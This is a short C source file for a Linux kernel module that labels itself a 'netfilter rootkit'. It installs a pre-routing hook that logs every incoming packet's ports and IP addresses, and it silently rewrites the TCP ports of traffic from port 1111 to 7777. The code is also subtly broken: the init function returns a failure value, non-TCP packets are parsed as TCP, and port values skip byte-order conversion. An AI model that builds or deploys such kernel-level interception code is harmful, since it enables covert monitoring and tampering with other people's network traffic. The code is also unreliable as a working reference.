#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/sched.h>
#include <linux/mm.h>
#include <linux/highmem.h>
#include <linux/skbuff.h>
#include <linux/in.h>
#include <linux/icmp.h>
#include <linux/tcp.h>
#include <linux/ip.h>
#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
 
 
//function define
int rootkit_init(void);
void rootkit_exit(void);
unsigned int sniff(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
 
//nf_hook_ops
 
struct nf_hook_ops net_hook;
 
int rootkit_init(void) {
   printk("Network Sniffing\n");
   //setting pre_hook;
   net_hook.hooknum =  NF_INET_PRE_ROUTING;
   net_hook.priority = NF_IP_PRI_FIRST;
   net_hook.pf = PF_INET;
   net_hook.hook = &sniff;
   nf_register_hook(&net_hook);
   return 1;
}
 
 
unsigned int sniff(void *priv, struct sk_buff *skb, const struct nf_hook_state *state){
   struct tcphdr *tcp_header;
   struct iphdr *ip_header = (struct iphdr*)skb_network_header(skb);
   u_int8_t protocol = ip_header->protocol;
   char if_forward[50] = {0,};
   unsigned int src_port = 0;
   unsigned int dest_port = 0;
   unsigned int src_ip = (unsigned int)ip_header->saddr;
   unsigned int dest_ip = (unsigned int)ip_header->daddr;
   tcp_header = (struct tcphdr *)skb_transport_header(skb);
   src_port = (unsigned int)ntohs(tcp_header->source);
   dest_port = (unsigned int)ntohs(tcp_header->dest);
   if(src_port == 1111)
      strcpy(if_forward, "forward: FORWARD packet ");
   else if(src_port == 7777)
      strcpy(if_forward, "forward: POST_ROUTING packet ");
   printk("%s(%d;%d;%d;%d;%d)", if_forward, protocol, src_port, dest_port, src_ip, dest_ip);
   if(src_port == 1111){ // Forwarding packet
      tcp_header->source = 7777;
      tcp_header->dest = 7777;
   }
   return NF_ACCEPT;
}
 

void rootkit_exit(void) {
   nf_unregister_hook(&net_hook);
}
 
 

MODULE_DESCRIPTION ("netfilter rootkit");
MODULE_LICENSE("GPL");

module_init(rootkit_init);
module_exit(rootkit_exit);
